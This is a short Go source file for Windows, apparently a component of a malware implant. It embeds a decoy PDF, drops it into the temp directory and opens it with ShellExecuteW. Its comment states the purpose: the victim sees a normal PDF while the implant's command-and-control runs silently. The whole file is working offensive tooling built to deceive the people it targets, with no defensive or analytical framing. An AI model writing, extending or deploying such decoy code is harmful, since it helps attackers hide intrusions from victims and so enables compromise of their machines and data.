//go:build windows

package main

import (
	_ "embed"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

//go:embed decoy.pdf
var decoyPDF []byte

// DropAndOpenPDF writes the embedded decoy PDF to temp and opens it with default handler.
// The victim sees a normal PDF while the implant C2 runs silently.
func DropAndOpenPDF() {
	if len(decoyPDF) == 0 {
		return
	}

	tmpPath := filepath.Join(os.TempDir(), "decoy.pdf")
	if err := os.WriteFile(tmpPath, decoyPDF, 0644); err != nil {
		return
	}

	shell32 := syscall.NewLazyDLL("shell32.dll")
	shellExecuteW := shell32.NewProc("ShellExecuteW")

	pathPtr, _ := syscall.UTF16PtrFromString(tmpPath)
	verbPtr, _ := syscall.UTF16PtrFromString("open")

	shellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(verbPtr)),
		uintptr(unsafe.Pointer(pathPtr)),
		0, 0,
		1, // SW_SHOWNORMAL
	)
}
